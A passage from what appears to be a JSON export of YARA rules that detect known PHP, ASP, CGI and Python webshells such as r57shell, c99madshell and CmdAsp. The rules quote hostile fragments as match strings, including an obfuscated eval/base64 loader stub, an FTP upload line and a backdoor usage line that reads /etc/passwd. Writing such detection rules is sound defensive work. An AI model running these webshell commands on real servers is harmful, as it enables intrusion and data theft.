https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"{mkdir(\\\"$dizin/$duzenx2\\\",777)\" \n      $s1 = \"$baglan=fopen($duzkaydet,'w');\" \n      $s2 = \"PHVayv 1.0\" \n   condition: \n      1 of them\n}","date":"2014-03-29 13:05:11","description":"Semi-Auto-generated - file phvayvv.php.php.txt","minimum_yara":"1.7","name":"Webshell_phvayvv_php_php_RID3108","reference":"-","required_modules":[],"rule_hash":"759aed6a70c98e3af49fc872b5db8db1","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_klasvayv_asp_RID2FBA : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file klasvayv.asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:09:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"set aktifklas=request.querystring(\\\"aktifklas\\\")\" \n      $s2 = \"action=\\\"klasvayv.asp?klasorac=1&aktifklas=<%=aktifklas%>&klas=<%=aktifklas%>\" \n      $s3 = \"<font color=\\\"#858585\\\">www.aventgrup.net\" \n      $s4 = \"style=\\\"BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT\" \n   condition: \n      1 of them\n}","date":"2014-03-29 12:09:31","description":"Semi-Auto-generated - file klasvayv.asp.txt","minimum_yara":"1.7","name":"Webshell_klasvayv_asp_RID2FBA","reference":"-","required_modules":[],"rule_hash":"2bd75bdc2f511cdacd82557430388115","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_r57shell_php_php_RID30EA : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file r57shell.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:00:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \" else if ($HTTP_POST_VARS['with'] == \\\"lynx\\\") { $HTTP_POST_VARS['cmd']= \\\"lynx \" \n      $s2 = \"RusH security team\" \n      $s3 = \"'ru_text12' => 'back-connect\" \n   condition: \n      1 of them\n}","date":"2014-03-29 13:00:11","description":"Semi-Auto-generated - file r57shell.php.php.txt","minimum_yara":"1.7","name":"Webshell_r57shell_php_php_RID30EA","reference":"-","required_modules":[],"rule_hash":"acaae5d6584082641ebadd401dc6e2f7","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_rst_sql_php_php_RID30FC : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file rst_sql.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:03:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"C:\\\\tmp\\\\dump_\" \n      $s1 = \"RST MySQL\" \n      $s2 = \"http://rst.void.ru\" \n      $s3 = \"$st_form_bg='R0lGODlhCQAJAIAAAOfo6u7w8yH5BAAAAAAALAAAAAAJAAkAAAIPjAOnuJfNHJh0qtfw0lcVADs=';\" \n   condition: \n      2 of them\n}","date":"2014-03-29 13:03:11","description":"Semi-Auto-generated - file rst_sql.php.php.txt","minimum_yara":"1.7","name":"Webshell_rst_sql_php_php_RID30FC","reference":"-","required_modules":[],"rule_hash":"e127e7259bae8d4ffb0f1664d53cebb2","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_wh_bindshell_py_RID30E1 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file wh_bindshell.py.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:58:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"#Use: python wh_bindshell.py [port] [password]\" \n      $s2 = \"python -c\\\"import md5;x=md5.new('you_password');print x.hexdigest()\\\"\" fullword\n      $s3 = \"#bugz: ctrl+c etc =script stoped=\" fullword\n   condition: \n      1 of them\n}","date":"2014-03-29 12:58:41","description":"Semi-Auto-generated - file wh_bindshell.py.txt","minimum_yara":"1.7","name":"Webshell_wh_bindshell_py_RID30E1","reference":"-","required_modules":[],"rule_hash":"e233cef3eba7b1bf10c3960d55d3a4e6","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_lurm_safemod_on_cgi_RID3272 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file lurm_safemod_on.cgi.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 14:05:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Network security team :: CGI Shell\" fullword\n      $s1 = \"#########################<<KONEC>>#####################################\" fullword\n      $s2 = \"##if (!defined$param{pwd}){$param{pwd}='Enter_Password'};##\" fullword\n   condition: \n      1 of them\n}","date":"2014-03-29 14:05:31","description":"Semi-Auto-generated - file lurm_safemod_on.cgi.txt","minimum_yara":"1.7","name":"Webshell_lurm_safemod_on_cgi_RID3272","reference":"-","required_modules":[],"rule_hash":"cbb8cdf15b1454ef556415f787a709da","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_c99madshell_v2_0_php_php_RID33A9 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file c99madshell_v2.0.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 14:57:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"eval(gzinflate(base64_decode('HJ3HkqNQEkU/ZzqCBd4t8V4YAQI2E3jvPV8/1Gw6orsVFLyXef\" \n   condition: \n      all of them\n}","date":"2014-03-29 14:57:21","description":"Semi-Auto-generated - file c99madshell_v2.0.php.php.txt","minimum_yara":"1.7","name":"Webshell_c99madshell_v2_0_php_php_RID33A9","reference":"-","required_modules":[],"rule_hash":"a93bef08df55d00b512777d6aa9fc2c9","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_backupsql_php_often_with_c99shell_RID37F5 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file backupsql.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 18:00:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"//$message.= \\\"--{$mime_boundary}\\\\n\\\" .\\\"Content-Type: {$fileatt_type};\\\\n\\\" .\" \n      $s4 = \"$ftpconnect = \\\"ncftpput -u $ftp_user_name -p $ftp_user_pass -d debsender_ftplog\" \n   condition: \n      all of them\n}","date":"2014-03-29 18:00:41","description":"Semi-Auto-generated - file backupsql.php.php.txt","minimum_yara":"1.7","name":"Webshell_backupsql_php_often_with_c99shell_RID37F5","reference":"-","required_modules":[],"rule_hash":"f8116d12c5c31d335443a04769cb13c3","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_uploader_php_php_RID3150 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file uploader.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:17:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"move_uploaded_file($userfile, \\\"entrika.php\\\"); \" fullword\n      $s3 = \"Send this file: <INPUT NAME=\\\"userfile\\\" TYPE=\\\"file\\\">\" fullword\n      $s4 = \"<INPUT TYPE=\\\"hidden\\\" name=\\\"MAX_FILE_SIZE\\\" value=\\\"100000\\\">\" fullword\n   condition: \n      2 of them\n}","date":"2014-03-29 13:17:11","description":"Semi-Auto-generated - file uploader.php.php.txt","minimum_yara":"1.7","name":"Webshell_uploader_php_php_RID3150","reference":"-","required_modules":[],"rule_hash":"83dcb76c67b773f9e81691e942d76e0b","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_telnet_pl_RID2E6D : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file telnet.pl.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:14:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"W A R N I N G: Private Server\" \n      $s2 = \"$Message = q$<pre><font color=\\\"#669999\\\"> _____  _____  _____          _____   \" \n   condition: \n      all of them\n}","date":"2014-03-29 11:14:01","description":"Semi-Auto-generated - file telnet.pl.txt","minimum_yara":"1.7","name":"Webshell_telnet_pl_RID2E6D","reference":"-","required_modules":[],"rule_hash":"77a38a261ee4bb41ff20cae0251972be","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_w3d_php_php_RID2F02 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file w3d.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:38:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"W3D Shell\" \n      $s1 = \"By: Warpboy\" \n      $s2 = \"No Query Executed\" \n   condition: \n      2 of them\n}","date":"2014-03-29 11:38:51","description":"Semi-Auto-generated - file w3d.php.php.txt","minimum_yara":"1.7","name":"Webshell_w3d_php_php_RID2F02","reference":"-","required_modules":[],"rule_hash":"21bd2dc4c3f4f3a004bcc9ed68c68806","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_WebShell_cgi_RID2F4E : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file WebShell.cgi.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:51:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"WebShell.cgi\" \n      $s2 = \"<td><code class=\\\"entry-[% if entry.all_rights %]mine[% else\" \n   condition: \n      all of them\n}","date":"2014-03-29 11:51:31","description":"Semi-Auto-generated - file WebShell.cgi.txt","minimum_yara":"1.7","name":"Webshell_WebShell_cgi_RID2F4E","reference":"-","required_modules":[],"rule_hash":"317b67e7d08dfaee7374e6afa2a38c54","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_WinX_Shell_html_RID3097 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file WinX Shell.html.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:46:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"WinX Shell\" \n      $s1 = \"Created by greenwood from n57\" \n      $s2 = \"<td><font color=\\\\\\\"#990000\\\\\\\">Win Dir:</font></td>\" \n   condition: \n      2 of them\n}","date":"2014-03-29 12:46:21","description":"Semi-Auto-generated - file WinX Shell.html.txt","minimum_yara":"1.7","name":"Webshell_WinX_Shell_html_RID3097","reference":"-","required_modules":[],"rule_hash":"4024a3fad1e084d6cb207be55a4b8278","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_csh_php_php_RID2F32 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file csh.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:46:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \".::[c0derz]::. web-shell\" \n      $s1 = \"http://c0derz.org.ua\" \n      $s2 = \"vint21h@c0derz.org.ua\" \n      $s3 = \"$name='63a9f0ea7bb98050796b649e85481845';//root\" \n   condition: \n      1 of them\n}","date":"2014-03-29 11:46:51","description":"Semi-Auto-generated - file csh.php.php.txt","minimum_yara":"1.7","name":"Webshell_csh_php_php_RID2F32","reference":"-","required_modules":[],"rule_hash":"8837657cf099791938128b4bf969ce6c","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_pHpINJ_php_php_RID2FFD : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file pHpINJ.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:20:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"News Remote PHP Shell Injection\" \n      $s3 = \"Php Shell <br />\" fullword\n      $s4 = \"<input type = \\\"text\\\" name = \\\"url\\\" value = \\\"\" \n   condition: \n      2 of them\n}","date":"2014-03-29 12:20:41","description":"Semi-Auto-generated - file pHpINJ.php.php.txt","minimum_yara":"1.7","name":"Webshell_pHpINJ_php_php_RID2FFD","reference":"-","required_modules":[],"rule_hash":"951fa65e193e930ef4024b613e262d05","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Dx_php_php_RID2EB0 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Dx.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:25:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"print \\\"\\\\n\\\".'Tip: to view the file \\\"as is\\\" - open the page in <a href=\\\"'.Dx\" \n      $s2 = \"$DEF_PORTS=array (1=>'tcpmux (TCP Port Service Multiplexer)',2=>'Management Util\" \n      $s3 = \"$ra44  = rand(1,99999);$sj98 = \\\"sh-$ra44\\\";$ml = \\\"$sd98\\\";$a5 = $_SERVER['HTTP\" \n   condition: \n      1 of them\n}","date":"2014-03-29 11:25:11","description":"Semi-Auto-generated - file Dx.php.php.txt","minimum_yara":"1.7","name":"Webshell_Dx_php_php_RID2EB0","reference":"-","required_modules":[],"rule_hash":"3a164b5bfba340b5026c2421eae2004b","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_sig_2008_php_php_RID3060 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file 2008.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:37:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Codz by angel(4ngel)\" \n      $s1 = \"Web: http://www.4ngel.net\" \n      $s2 = \"$admin['cookielife'] = 86400;\" \n      $s3 = \"$errmsg = 'The file you want Downloadable was nonexistent';\" \n   condition: \n      1 of them\n}","date":"2014-03-29 12:37:11","description":"Semi-Auto-generated - file 2008.php.php.txt","minimum_yara":"1.7","name":"Webshell_sig_2008_php_php_RID3060","reference":"-","required_modules":[],"rule_hash":"f31e48cac7b568f19e12e886b7cea249","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_ak74shell_php_php_RID3143 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file ak74shell.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:15:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$res .= '<td align=\\\"center\\\"><a href=\\\"'.$xshell.'?act=chmod&file='.$_SESSION[\" \n      $s2 = \"AK-74 Security Team Web Site: www.ak74-team.net\" \n      $s3 = \"$xshell\" \n   condition: \n      2 of them\n}","date":"2014-03-29 13:15:01","description":"Semi-Auto-generated - file ak74shell.php.php.txt","minimum_yara":"1.7","name":"Webshell_ak74shell_php_php_RID3143","reference":"-","required_modules":[],"rule_hash":"93ba01efa20fb9a454a4a51e7f2230a7","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Rem_View_php_php_RID3112 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Rem View.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:06:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$php=\\\"/* line 1 */\\\\n\\\\n// \\\".mm(\\\"for example, uncomment next line\\\").\\\"\" \n      $s2 = \"<input type=submit value='\\\".mm(\\\"Delete all dir/files recursive\\\").\\\" (rm -fr)'\" \n      $s4 = \"Welcome to phpRemoteView (RemView)\" \n   condition: \n      1 of them\n}","date":"2014-03-29 13:06:51","description":"Semi-Auto-generated - file Rem View.php.php.txt","minimum_yara":"1.7","name":"Webshell_Rem_View_php_php_RID3112","reference":"-","required_modules":[],"rule_hash":"c8b71fdebb0e5e13446d7b4ab27f3c24","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Java_Shell_js_RID2FBB : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Java Shell.js.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:09:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"PySystemState.initialize(System.getProperties(), null, argv);\" fullword\n      $s3 = \"public class JythonShell extends JPanel implements Runnable {\" fullword\n      $s4 = \"public static int DEFAULT_SCROLLBACK = 100\" \n   condition: \n      2 of them\n}","date":"2014-03-29 12:09:41","description":"Semi-Auto-generated - file Java Shell.js.txt","minimum_yara":"1.7","name":"Webshell_Java_Shell_js_RID2FBB","reference":"-","required_modules":[],"rule_hash":"628ac0a54ad99c19e1d1329d1563e04f","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_STNC_php_php_RID2F2C : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file STNC.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:45:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"drmist.ru\" fullword\n      $s1 = \"hidden(\\\"action\\\",\\\"download\\\").hidden_pwd().\\\"<center><table><tr><td width=80\" \n      $s2 = \"STNC WebShell\" \n      $s3 = \"http://www.security-teams.net/index.php?showtopic=\" \n   condition: \n      1 of them\n}","date":"2014-03-29 11:45:51","description":"Semi-Auto-generated - file STNC.php.php.txt","minimum_yara":"1.7","name":"Webshell_STNC_php_php_RID2F2C","reference":"-","required_modules":[],"rule_hash":"8f8dd0097027f710c7fa991ef2432bd6","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_aZRaiLPhp_v1_0_php_RID312D : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file aZRaiLPhp v1.0.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:11:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"azrailphp\" \n      $s1 = \"<br><center><INPUT TYPE='SUBMIT' NAME='dy' VALUE='Dosya Yolla!'></center>\" \n      $s3 = \"<center><INPUT TYPE='submit' name='okmf' value='TAMAM'></center>\" \n   condition: \n      2 of them\n}","date":"2014-03-29 13:11:21","description":"Semi-Auto-generated - file aZRaiLPhp v1.0.php.txt","minimum_yara":"1.7","name":"Webshell_aZRaiLPhp_v1_0_php_RID312D","reference":"-","required_modules":[],"rule_hash":"8cf24ef49a7b9802a62516a3a461b10b","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_zacosmall_php_RID3013 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file zacosmall.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:24:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"rand(1,99999);$sj98\" \n      $s1 = \"$dump_file.='`'.$rows2[0].'`\" \n      $s3 = \"filename=\\\\\\\"dump_{$db_dump}_${table_d\" \n   condition: \n      2 of them\n}","date":"2014-03-29 12:24:21","description":"Semi-Auto-generated - file zacosmall.php.txt","minimum_yara":"1.7","name":"Webshell_zacosmall_php_RID3013","reference":"-","required_modules":[],"rule_hash":"5fc1645d17f817e56493316142fba9f3","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_CmdAsp_asp_RID2E81 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file CmdAsp.asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:17:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"CmdAsp.asp\" \n      $s1 = \"Set oFileSys = Server.CreateObject(\\\"Scripting.FileSystemObject\\\")\" fullword\n      $s2 = \"-- Use a poor man's pipe ... a temp file --\" \n      $s3 = \"maceo @ dogmile.com\" \n   condition: \n      2 of them\n}","date":"2014-03-29 11:17:21","description":"Semi-Auto-generated - file CmdAsp.asp.txt","minimum_yara":"1.7","name":"Webshell_CmdAsp_asp_RID2E81","reference":"-","required_modules":[],"rule_hash":"b407964cce301d5b119c24db06a2acb2","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_mysql_shell_php_RID30FA : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file mysql_shell.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:02:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"SooMin Kim\" \n      $s1 = \"smkim@popeye.snu.ac.kr\" \n      $s2 = \"echo \\\"<td><a href='$PHP_SELF?action=deleteData&dbname=$dbname&tablename=$tablen\" \n   condition: \n      1 of them\n}","date":"2014-03-29 13:02:51","description":"Semi-Auto-generated - file mysql_shell.php.txt","minimum_yara":"1.7","name":"Webshell_mysql_shell_php_RID30FA","reference":"-","required_modules":[],"rule_hash":"17480783154b67d617c06169faed44b9","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Moroccan_Spamers_Ma_EditioN_By_GhOsT_php_RID3A0F : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Moroccan Spamers Ma-EditioN By GhOsT.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 19:30:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \";$sd98=\\\"john.barker446@gmail.com\\\"\" \n      $s1 = \"print \\\"Sending mail to $to....... \\\";\" \n      $s2 = \"<td colspan=\\\"2\\\" width=\\\"715\\\" background=\\\"/simparts/images/cellpic1.gif\\\" hei\" \n   condition: \n      1 of them\n}","date":"2014-03-29 19:30:21","description":"Semi-Auto-generated - file Moroccan Spamers Ma-EditioN By GhOsT.php.txt","minimum_yara":"1.7","name":"Webshell_Moroccan_Spamers_Ma_EditioN_By_GhOsT_php_RID3A0F","reference":"-","required_modules":[],"rule_hash":"12dc695f065eb9f1299976585e7ef5ce","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_simple_backdoor_php_RID327B : DEMO MAL T1087 T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file simple-backdoor.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 14:07:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, MAL, T1087, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$cmd = ($_REQUEST['cmd']);\" fullword\n      $s1 = \"<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->\" \n      $s2 = \"Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd\" fullword\n   condition: \n      2 of them\n}","date":"2014-03-29 14:07:01","description":"Semi-Auto-generated - file simple-backdoor.php.txt","minimum_yara":"1.7","name":"Webshell_simple_backdoor_php_RID327B","reference":"-","required_modules":[],"rule_hash":"0c4d010ae5103be4eb5aa9668ef32c40","score":75,"tags":["T1100","DEMO","WEBSHELL","T1087","MAL"]},{"author":"Florian Roth","content":"rule Webshell_Dive_Shell_1_0___Emperor_Hacking_Team_php_RID3A3C : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Dive Shell 1.0 - Emperor Hacking Team.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 19:37:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Emperor Hacking TEAM\" \n      $s1 = \"Simshell\" fullword\n      $s2 = \"ereg('^[[:blank:]]*cd[[:blank:]]\" \n      $s3 = \"<form name=\\\"shell\\\" action=\\\"<?php echo $_SERVER['PHP_SELF'] ?>\\\" method=\\\"POST\" \n   condition: \n      2 of them\n}","date":"2014-03-29 19:37:51","description":"Semi-Auto-generated - file Dive Shell 1.0 - Emperor Hacking 